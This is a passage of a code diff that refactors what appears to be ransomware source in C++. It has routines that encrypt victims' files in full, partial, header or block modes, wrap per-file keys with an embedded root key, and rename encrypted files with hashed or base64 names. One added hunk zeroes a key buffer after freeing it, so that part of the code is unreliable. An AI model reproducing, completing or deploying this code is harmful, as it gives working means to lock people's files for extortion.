 				printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
 				goto END;
@@ -1209,57 +1232,56 @@ BOOL filesystem::FileCryptDecrypt
 		}
 		else
 		{
-			if (!EncryptFileHeader(&FileInfo, newFilename))
+			if (!EncryptFileHeader(&FileInfo))
 			{
 				printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
 				goto END;
 			}
 		}
 	}
-	else if (mode == FULL_ENCRYPT)	
+	else if (mode == EncryptModes::FULL_ENCRYPT)
 	{
-		if (!EncryptFileFullData(&FileInfo, newFilename))
+		if (!EncryptFileFullData(&FileInfo))
 		{
 			printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}		
 	}
-	else if (mode == PARTLY_ENCRYPT)	
+	else if (mode == EncryptModes::PARTLY_ENCRYPT)
 	{
-		if (!EncryptFilePartly(&FileInfo, newFilename, 20))
+		if (!EncryptFilePartly(&FileInfo, 20))
 		{
 			printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}		
 	}
-	else if (mode == HEADER_ENCRYPT)
+	else if (mode == EncryptModes::HEADER_ENCRYPT)
 	{
-		if (!EncryptFileHeader(&FileInfo, newFilename))
+		if (!EncryptFileHeader(&FileInfo))
 		{
 			printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}
 	}
-	else if (mode == BLOCK_ENCRYPT)
+	else if (mode == EncryptModes::BLOCK_ENCRYPT)
 	{
-		if (!EncryptFileBlock(&FileInfo, newFilename))
+		if (!EncryptFileBlock(&FileInfo))
 		{
 			printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}
 	}
-
-	LARGE_INTEGER Offset;
-	Offset.QuadPart = -cat;
-	if (SetFilePointerEx(FileInfo.newFileHandle, Offset, NULL, FILE_END)) 
-	{
-		SetEndOfFile(FileInfo.newFileHandle);		
-	}
-
+	
 	SUCCESS_return = TRUE;
 END:	
-	if(EncryptedKey)
+	memory::memzero_explicit(PrivateKey, 4096);
+	if (EncryptedKey)
+	{
+		memory::memzero_explicit(EncryptedKey, EncryptedKeySize);
+		memory::memzero_explicit(CryptKey, 32);
+		memory::memzero_explicit(CryptIV, 8);
 		memory::m_free(EncryptedKey);
+	}
 	if (FileInfo.FileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
 		CloseHandle(FileInfo.FileHandle);
 	if (FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
@@ -1564,16 +1586,13 @@ END:
 	if (Buffer)
 		memory::m_free(Buffer);
 	if (!SignatureRoot && key)
+	{
 		memory::m_free(key);
+		memory::memzero_explicit(key, 4096);
+	}
 
 
 	return success;
-}
-
-INLINE VOID memzero_explicit(BYTE* buff, DWORD size)
-{
-	volatile BYTE* ptr = buff;
-	while (size--) *ptr++ = 0;
 }
 
 VOID filesystem::RootKeySignatureTrust(VOID)
@@ -1608,13 +1627,13 @@ VOID filesystem::RootKeySignatureTrust(VOID)
 end:
 	if (g_PublicKeyRoot)
 	{
-		memzero_explicit(g_PublicKeyRoot, size);
+		memory::memzero_explicit(g_PublicKeyRoot, size);
 		memory::m_free(g_PublicKeyRoot);
 	}
 		
 	if (g_PrivateKeyRoot)
 	{
-		memzero_explicit(g_PrivateKeyRoot, size);
+		memory::memzero_explicit(g_PrivateKeyRoot, size);
 		memory::m_free(g_PrivateKeyRoot);
 	}
 	
@@ -1671,7 +1690,7 @@ WCHAR* filesystem::MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR
 		WCHAR* name = (WCHAR*)memory::m_malloc((260) * sizeof(WCHAR));
 		wmemcpy_s(name, len, FPath, len);
 		
-		if (global::GetCryptName() == BASE64_NAME)
+		if (global::GetCryptName() == Name::BASE64_NAME)
 		{
 			SafeURLBase64(&name[len_path + 1], len_filename - ECRYPT_NAME_LEN, BASE_CRYPT);
 
@@ -1702,7 +1721,7 @@ WCHAR* filesystem::MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR
 	}
 	else
 	{
-		if (global::GetCryptName() == HASH_NAME)
+		if (global::GetCryptName() == Name::HASH_NAME)
 		{
 			CHAR ptr[260] = { 0 };
 			u8 out[32] = { 0 };
@@ -1716,7 +1735,7 @@ WCHAR* filesystem::MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR
 			wmemcpy_s(&FullPath[memory::StrLen(FullPath)], ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);
 			return FullPath;
 		}
-		if (global::GetCryptName() == BASE64_NAME)
+		if (global::GetCryptName() == Name::BASE64_NAME)
 		{						
 			if ((len_filename + (len_filename / 3)) > MAX_PATH)
 			{
